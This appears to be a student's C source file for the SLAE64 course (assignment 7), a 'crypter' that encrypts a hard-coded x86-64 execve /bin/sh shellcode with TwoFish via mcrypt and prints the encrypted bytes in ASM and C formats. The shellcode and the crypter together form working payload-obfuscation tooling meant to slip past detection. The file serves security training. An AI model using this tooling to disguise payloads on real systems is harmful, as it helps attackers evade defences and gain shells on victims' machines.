/*
  Author: Guillem Alminyana
  StudentID:  PA-14628
  SLAE64 Assignment #7: Crypter
  =====================================

This piece of code encrypts a string using TwoFish. 
This is done by using the mcrypt library (apt-get install libmcrypt-dev).

Global vars:

    unsigned char code[] -> string with the shellcode
    char password[]      -> Password used for encryption
    unsigned char IV     -> IVs used by TwoFish in the process

Compile using gcc: 

  gcc -L/usr/include -lmcrypt TwoFish_Crypter.c -o TwoFish_Crypter

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <mcrypt.h>

/*
  TwoFish needed setups
*/

#define IV_SIZE 16
unsigned char password[] = "12345678";
/* 
  Making value of IV[16] a fixed one for testings.
  Just uncomment lines in code to enable random IV
*/
unsigned char IV[IV_SIZE];

/*
  ShellCode to Cypher
	Execve-Shell-Stack.nasm
*/
unsigned char code[]= \
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48"
"\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";

int main (void)
{

	MCRYPT id_crypt;
	int code_length = strlen(code);

	/* Initialize the seed for the rand() function to generate IV */
	srand(time(0));

	/* Print the Orginal Uncrypted Shellcode */
	printf("\nOriginal Shellcode to Cypher (%d bytes):\n", code_length);
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	// Remove last ","

	/* MCrypt TwoFish Initialization */
	id_crypt = mcrypt_module_open("twofish", NULL, "cfb", NULL);

	/* IV initialization */
	printf("\n\nTwoFish IV value (C format): ");
	int iv_size = mcrypt_enc_get_iv_size(id_crypt);
	for (int i = 0; i < iv_size; i++)
	{
		IV[i] = (unsigned char)'\x01';
		//IV[i] = (unsigned char)rand();    // Uncomment for random IV
		printf("\\x%02x", IV[i]);
	}

	/* Print Password used for crypting */
	printf("\nTwoFish Password Used: %s", password);

	/* Initialize the encryption process with the pass and IV */
	int x = mcrypt_generic_init(id_crypt, password, 16, IV);
	if (x < 0)		// Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Encryption of the code[] string */
	x = mcrypt_generic(id_crypt, code, code_length);
	if ( x < 0)		// Error Handling
	{
		mcrypt_perror(x);
		printf("\n!! ERROR: %d !!", x);
		return MCRYPT_FAILED;
	}

	/* Print the crypted shellcode */
	printf("\n\nCrypted Shellcode:\n\n  ASM Format: \n");

		/* First printed in ASM format */
	for (int i = 0; i < code_length-1; i++)
	{
		printf("0x%02x,", code[i]);
	}
	printf("0x%02x", code[code_length-1]);	// Remove ","

		/* Now printed in C format */
	printf("\n\n  C Format: \n");
	for (int i = 0; i < code_length; i++)
	{
		printf("\\x%02x", code[i]);
	}
	//printf("\\x%02x", code[code_length-1]);

	/* End the mcrypt */
	mcrypt_generic_end(id_crypt);

	printf("\nCrypted!\n\n");
	return 0;
	
}	

